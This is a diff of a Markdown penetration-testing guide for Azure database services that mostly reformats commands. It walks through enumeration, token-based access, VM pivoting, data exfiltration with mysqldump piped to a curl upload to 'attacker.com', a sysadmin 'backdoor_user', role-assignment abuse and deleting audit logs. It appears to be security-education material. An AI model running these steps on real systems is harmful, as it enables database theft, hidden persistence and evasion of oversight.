@@ -1,63 +1,67 @@
 # Azure Database
 
-**Azure Penetration Testing** on **Azure Database Services** (Azure SQL, MySQL, PostgreSQL, etc.).
-
-Why are so many Azures Cosmos DB breached?
-
-What are the advantages of cloud-based databases?
-
+**Azure Penetration Testing** on **Azure Database Services** (Azure SQL,
+MySQL, PostgreSQL, etc.).
 
 # Azure Database Services 
 
 Azure provides **PaaS-managed relational databases** like:
 
 - Azure SQL Database (SQL Server)
+
 - Azure Database for MySQL
+
 - Azure Database for PostgreSQL
+
 - Flexible Server and Hyperscale options
 
 ## Authentication Methods
 
-- Username + Password (most common)
-- Azure Active Directory (AAD) Authentication
-- Certificate-based access (for PostgreSQL)
+- **Username + Password** (most common)
 
-- Connections can be restricted at network-level via:
+- **Azure Active Directory (AAD) Authentication**
+
+- **Certificate-based access** (for PostgreSQL)
+
+- Connections can be **restricted at network-level** via:
 
   - VNet service endpoints
+
   - Private endpoints
+
   - Firewall rules
+
   - Access from specific Azure resources (e.g., VMs, Functions)
 
 # Enumeration
 
-List All Database Servers (SQL, MySQL, PostgreSQL)
+**🔹 List All Database Servers (SQL, MySQL, PostgreSQL)**
 
-    az sql server list -o table
+az sql server list -o table
 
-    az mysql server list -o table
+az mysql server list -o table
 
-    az postgres server list -o table
+az postgres server list -o table
 
-List Databases on a Server
+**🔹 List Databases on a Server**
 
-    az sql db list --server \<server_name\> -o table
+az sql db list --server \<server_name\> -o table
 
-    az mysql db list --server-name \<server_name\>
+az mysql db list --server-name \<server_name\>
 
-    az postgres db list --server-name \<server_name\>
+az postgres db list --server-name \<server_name\>
 
 **🔹 List Firewall Rules (Look for overly permissive rules)**
 
-    az sql server firewall-rule list --server \<server_name\>
+az sql server firewall-rule list --server \<server_name\>
 
-    az mysql server firewall-rule list --server \<server_name\>
+az mysql server firewall-rule list --server \<server_name\>
 
-    az postgres server firewall-rule list --server \<server_name\>
+az postgres server firewall-rule list --server \<server_name\>
 
 **🔹 List Virtual Network Rules**
 
-    az sql server vnet-rule list --server \<server_name\>
+az sql server vnet-rule list --server \<server_name\>
 
 # Exploitation & Data Exfiltration
 
@@ -65,59 +69,70 @@ List Databases on a Server
 
 \# SQL Server
 
-    sqlcmd -S \<server_name\>.database.windows.net -U \<username\> -P \<password\> -d \<database\>
+sqlcmd -S \<server_name\>.database.windows.net -U \<username\> -P
+\<password\> -d \<database\>
 
 \# MySQL
 
-    mysql -h \<server_name\>.mysql.database.azure.com -u \<username\> -p \# PostgreSQL
+mysql -h \<server_name\>.mysql.database.azure.com -u \<username\> -p
 
-    psql "host=\<server_name\>.postgres.database.azure.com user=\<username\> dbname=\<dbname\> sslmode=require"
+\# PostgreSQL
+
+psql "host=\<server_name\>.postgres.database.azure.com user=\<username\>
+dbname=\<dbname\> sslmode=require"
 
 **🔸 Target: Azure AD-based Authentication**
 
 **1️⃣ Verify Identity**
 
-    az account show
+az account show
 
-    az ad signed-in-user show
+az ad signed-in-user show
 
 **2️⃣ List Assigned Roles**
 
-    az role assignment list --assignee \<user_or_service_principal\>
+az role assignment list --assignee \<user_or_service_principal\>
 
 **3️⃣ Connect Using Azure CLI Token (SQL Server Example)**
 
-    az sql db show-connection-string --client ado.net --server \<server_name\>
+az sql db show-connection-string --client ado.net --server
+\<server_name\>
 
 \# Generate token (you must be AAD user)
 
-    az account get-access-token --resource https://database.windows.net/ --query accessToken -o tsv
+az account get-access-token --resource https://database.windows.net/
+--query accessToken -o tsv
 
-Use token in SQL client that supports AAD (e.g., sqlcmd, SSMS, Azure Data Studio).
+Use token in SQL client that supports AAD (e.g., sqlcmd, SSMS, Azure
+Data Studio).
 
 # Lateral Movement or Access via Compromised VM
 
 If the DB is in a private VNet:
 
 - **Compromise a VM in the same VNet** via RCE or stolen credentials.
-- Use that VM as a **pivot point** to connect to the database via private endpoint or service endpoint.
 
-    mysql -h \<private_ip_or_dns\> -u \<username\> -p
+- Use that VM as a **pivot point** to connect to the database via
+  private endpoint or service endpoint.
+
+mysql -h \<private_ip_or_dns\> -u \<username\> -p
 
 **🧪 Data Exfiltration Methods**
 
 - Use mysqldump, pg_dump, or bcp to export database contents.
 
-    \# MySQL example
+\# MySQL example
 
-    mysqldump -h \<host\> -u \<user\> -p database_name \> dump.sql
+mysqldump -h \<host\> -u \<user\> -p database_name \> dump.sql
 
 - Transfer dump over HTTP/SFTP/SOCAT/Reverse shell from compromised VM.
 
 **🛡️ Persistence Techniques**
 
 - Add an AAD user to a DB role with admin privileges.
+
 - Modify database user roles (if permissions allow).
+
 - Alter stored procedures or triggers to establish callback channels.
 
 **📌 Summary (Azure-Specific)**
@@ -147,30 +162,33 @@ exploitation, and persistence.
 
 **Actions:**
 
-    az account show \# Get current subscription
+az account show \# Get current subscription
 
-    az sql server list \# Enumerate SQL servers
+az sql server list \# Enumerate SQL servers
 
-    az mysql server list \# Enumerate MySQL servers
+az mysql server list \# Enumerate MySQL servers
 
-    az postgres server list \# Enumerate PostgreSQL servers
+az postgres server list \# Enumerate PostgreSQL servers
 
-    az sql db list --server \<name\> \# List SQL databases on target
+az sql db list --server \<name\> \# List SQL databases on target
 
 ## 2. Initial Access
 
 **Option A: Public Database Endpoint + Weak Passwords**
 
-- Try default creds, credential stuffing, or bruteforce on database endpoints.
+- Try default creds, credential stuffing, or bruteforce on database
+  endpoints.
 
 **Option B: Azure VM Compromise**
 
-- Gain access to a VM in the same VNet/subnet as the DB (via RCE, password reuse, etc.).
+- Gain access to a VM in the same VNet/subnet as the DB (via RCE,
+  password reuse, etc.).
+
 - Check for Private Endpoint or Service Endpoint access.
 
 \# From inside VM
 
-    mysql -h \<private-db-ip\> -u admin -p
+mysql -h \<private-db-ip\> -u admin -p
 
 **Option C: Web App SSRF or Command Injection**
 
@@ -180,46 +198,49 @@ exploitation, and persistence.
 
 **From CLI:**
 
-    az sql db list --server \<target-server\>
+az sql db list --server \<target-server\>
 
-    az sql server firewall-rule list --server \<target-server\>
+az sql server firewall-rule list --server \<target-server\>
 
-    az sql server vnet-rule list --server \<target-server\>
+az sql server vnet-rule list --server \<target-server\>
 
 **From inside DB (SQL Server Example):**
 
-    SELECT name FROM sys.databases;
+SELECT name FROM sys.databases;
 
-    SELECT \* FROM information_schema.tables;
+SELECT \* FROM information_schema.tables;
 
-    SELECT \* FROM \<table\> -- Data exfil
+SELECT \* FROM \<table\> -- Data exfil
 
 ## 4. Exploitation
 
 **🔸 Password-based Access:**
 
-    mysql -h \<hostname\> -u \<username\> -p
+mysql -h \<hostname\> -u \<username\> -p
 
-    psql "host=\<hostname\> dbname=\<dbname\> user=\<user\> password=\<password\>"
+psql "host=\<hostname\> dbname=\<dbname\> user=\<user\>
+password=\<password\>"
 
-    sqlcmd -S \<server\>.database.windows.net -U user -P pass
+sqlcmd -S \<server\>.database.windows.net -U user -P pass
 
 **🔸 Azure AD Token-Based Auth:**
 
-    TOKEN=\$(az account get-access-token --resource https://database.windows.net/ --query accessToken -o tsv)
+TOKEN=\$(az account get-access-token --resource
+https://database.windows.net/ --query accessToken -o tsv)
 
-    sqlcmd -S \<server\>.database.windows.net -G -U \<aad_user\> -P \$TOKEN
+sqlcmd -S \<server\>.database.windows.net -G -U \<aad_user\> -P \$TOKEN
 
 ## 5. Data Exfiltration
 
 **Methods:**
 
 - mysqldump, pg_dump, sqlcmd, or bcp to dump data.
+
 - Encode and send over HTTP, SFTP, or reverse shell.
 
-    mysqldump -h host -u user -p dbname \> dump.sql
+mysqldump -h host -u user -p dbname \> dump.sql
 
-    curl -F "file=@dump.sql" http://attacker.com/upload
+curl -F "file=@dump.sql" http://attacker.com/upload
 
 ## 6. Persistence
 
@@ -227,28 +248,37 @@ exploitation, and persistence.
 
 - Add a new user with admin role:
 
-    CREATE LOGIN backdoor_user WITH PASSWORD = 'P@ssw0rd!';
+CREATE LOGIN backdoor_user WITH PASSWORD = 'P@ssw0rd!';
 
-    ALTER SERVER ROLE sysadmin ADD MEMBER backdoor_user;
+ALTER SERVER ROLE sysadmin ADD MEMBER backdoor_user;
 
 - Abuse Azure Role Assignments (if permissions exist):
 
-    az role assignment create --assignee \<attacker\> --role "SQL DB Contributor" --scope \<resource_id\>
+az role assignment create --assignee \<attacker\> --role "SQL DB
+Contributor" --scope \<resource_id\>
 
 ## 7. Covering Tracks 
 
 - Delete audit logs (if you have DB-level access).
+
 - Remove temporary user accounts created.
+
 - Clean firewall or role changes.
 
 ## Visual Summary
 
 1.  **Recon** → List DB Servers
+
 2.  **Initial Access** → Public endpoint / VM pivot / SSRF
+
 3.  **Enumerate** → Databases, rules, roles
+
 4.  **Exploit** → Connect with creds or token
+
 5.  **Exfiltrate** → Dump data and export
+
 6.  **Persist** → Backdoor users or IAM role assignment
+
 7.  **(Optional) Cover** → Clean logs, revert changes
 
 # Azure PenTest: SSO, Monitoring, Threat Detection, VNet & Lateral Movement
